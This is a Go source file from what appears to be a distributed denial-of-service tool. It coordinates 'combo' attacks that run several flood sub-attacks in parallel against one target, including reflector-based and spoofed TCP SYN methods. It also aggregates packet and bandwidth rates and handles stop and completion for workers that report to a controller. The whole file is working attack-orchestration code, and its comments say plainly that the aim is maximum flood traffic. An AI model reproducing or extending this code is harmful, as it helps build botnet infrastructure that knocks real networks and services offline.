package attack

import (
	"sync"
	"sync/atomic"
	"time"
)

type ComboSession struct {
	Sessions []*AttackSession
	Stats    *AttackStats
	StopChan chan struct{}
	DoneChan chan struct{}
	stopped  int32
}

func NewComboSession(sessions []*AttackSession) *ComboSession {
	cs := &ComboSession{
		Sessions: sessions,
		Stats:    &AttackStats{StartTime: time.Now()},
		StopChan: make(chan struct{}),
		DoneChan: make(chan struct{}),
	}
	go cs.trackComboRates()
	go cs.watchCompletion()
	return cs
}

func (cs *ComboSession) Stop() {
	if !atomic.CompareAndSwapInt32(&cs.stopped, 0, 1) {
		// 已经停止，直接等待完成（最多5秒）
		select {
		case <-cs.DoneChan:
		case <-time.After(5 * time.Second):
		}
		return
	}

	close(cs.StopChan)

	// 统一 5s 超时：并行停止所有子攻击，但总共只等 5 秒。
	// 用"关闭语义"的通道（stop 关闭后所有接收者同时唤醒）——
	// time.After 的通道只投递一次，多个等待者共享会导致其余永久阻塞。
	stop := make(chan struct{})
	timer := time.NewTimer(5 * time.Second)
	defer timer.Stop()
	go func() {
		select {
		case <-timer.C:
			close(stop)
		case <-cs.StopChan:
			// 立即停止信号已发出：给子会话 5 秒收尾后统一唤醒
			select {
			case <-timer.C:
				close(stop)
			}
		}
	}()

	// 并行触发所有子攻击停止（串行 Stop 时每个最多等 5s，
	// N 个子攻击会让 worker 心跳主循环阻塞最长 5N 秒，
	// 直接导致 Controller 误判离线、任务被重复派发）
	for _, s := range cs.Sessions {
		s.finish()
	}

	var wg sync.WaitGroup
	for _, s := range cs.Sessions {
		wg.Add(1)
		go func(s *AttackSession) {
			defer wg.Done()
			select {
			case <-s.DoneChan:
			case <-stop:
			}
		}(s)
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
	case <-stop:
	}
}

func (cs *ComboSession) finish() {
	if atomic.CompareAndSwapInt32(&cs.stopped, 0, 1) {
		close(cs.StopChan)
	}
}

// watchCompletion 等待所有子攻击真正结束（各自 duration 到期或 Stop），
// 然后关闭 DoneChan 通知 worker 上报完成。
//
// 关键：不能对"等待子会话结束"使用固定 5s 超时——子会话的 DoneChan 只在
// 各自 duration 到期时关闭，60s 的 combo 会在 5s 时被误判完成并上报，
// 而子攻击仍在继续（worker 侧已无引用可 Stop → 孤儿攻击 + Controller
// 重派时两波流量叠加）。
// 只有显式 Stop（StopChan 关闭）时才走 5s 兜底收尾。
func (cs *ComboSession) watchCompletion() {
	var wg sync.WaitGroup
	for _, s := range cs.Sessions {
		wg.Add(1)
		go func(s *AttackSession) {
			defer wg.Done()
			<-s.DoneChan
		}(s)
	}

	allDone := make(chan struct{})
	go func() {
		wg.Wait()
		close(allDone)
	}()

	select {
	case <-allDone:
		// 自然完成：所有子攻击 duration 到期
	case <-cs.StopChan:
		// 显式停止：给子会话 5 秒收尾（个别 goroutine 可能卡在网络 IO）
		select {
		case <-allDone:
		case <-time.After(5 * time.Second):
		}
	}

	cs.finish()
	close(cs.DoneChan)
}

func (cs *ComboSession) trackComboRates() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			var totalPackets, totalBytes, totalPPS, totalBPS uint64
			for _, s := range cs.Sessions {
				totalPackets += atomic.LoadUint64(&s.Stats.PacketsSent)
				totalBytes += atomic.LoadUint64(&s.Stats.BytesSent)
				totalPPS += atomic.LoadUint64(&s.Stats.CurrentPPS)
				totalBPS += atomic.LoadUint64(&s.Stats.CurrentBPS)
			}
			atomic.StoreUint64(&cs.Stats.PacketsSent, totalPackets)
			atomic.StoreUint64(&cs.Stats.BytesSent, totalBytes)
			atomic.StoreUint64(&cs.Stats.CurrentPPS, totalPPS)
			atomic.StoreUint64(&cs.Stats.CurrentBPS, totalBPS)
			if totalPPS > atomic.LoadUint64(&cs.Stats.PeakPPS) {
				atomic.StoreUint64(&cs.Stats.PeakPPS, totalPPS)
			}
			if totalBPS > atomic.LoadUint64(&cs.Stats.PeakBPS) {
				atomic.StoreUint64(&cs.Stats.PeakBPS, totalBPS)
			}
		case <-cs.StopChan:
			return
		}
	}
}

func (cs *ComboSession) Snapshot() AttackSnapshot {
	// PacketsSent/BytesSent 直接对各子会话即时累加，避免用 cs.Stats 上被
	// trackComboRates 每秒刷新一次的滞后缓存值（与 Errors 保持同一时刻语义）。
	var totalPkts, totalBytes, totalErr uint64
	for _, s := range cs.Sessions {
		totalPkts += atomic.LoadUint64(&s.Stats.PacketsSent)
		totalBytes += atomic.LoadUint64(&s.Stats.BytesSent)
		totalErr += atomic.LoadUint64(&s.Stats.Errors)
	}
	return AttackSnapshot{
		PacketsSent: totalPkts,
		BytesSent:   totalBytes,
		Errors:      totalErr,
		PPS:         atomic.LoadUint64(&cs.Stats.CurrentPPS),
		BPS:         atomic.LoadUint64(&cs.Stats.CurrentBPS),
		PeakPPS:     atomic.LoadUint64(&cs.Stats.PeakPPS),
		PeakMbps:    float64(atomic.LoadUint64(&cs.Stats.PeakBPS)) * 8.0 / 1000000.0,
		Elapsed:     time.Since(cs.Stats.StartTime).Seconds(),
	}
}

// StartComboAttack 并发启动多个子攻击。子攻击的 Targets 由调用方按需填充
// （反射器子攻击带各自池，直接攻击子攻击留空以打向 Target）。
func StartComboAttack(cfg AttackConfig, subCfgs []AttackConfig) *ComboSession {
	sessions := make([]*AttackSession, 0, len(subCfgs))

	for _, sub := range subCfgs {
		sub.Target = cfg.Target
		sub.Duration = cfg.Duration

		session := subAttackMethodToFunc(sub)
		if session != nil {
			sessions = append(sessions, session)
		}
	}

	if len(sessions) == 0 {
		cs := &ComboSession{
			Sessions: sessions,
			Stats:    &AttackStats{StartTime: time.Now()},
			StopChan: make(chan struct{}),
			DoneChan: make(chan struct{}),
		}
		close(cs.DoneChan)
		return cs
	}

	return NewComboSession(sessions)
}

// subAttackMethodToFunc 子攻击分派：委托 StartMethod（唯一方法清单来源），
// 避免与 worker 单任务分派出现两份 case 列表（历史上漏过 tcp_syn_spoof）。
func subAttackMethodToFunc(cfg AttackConfig) *AttackSession {
	if cfg.Method == "combo" {
		return nil // 组合不可嵌套
	}
	return StartMethod(cfg)
}
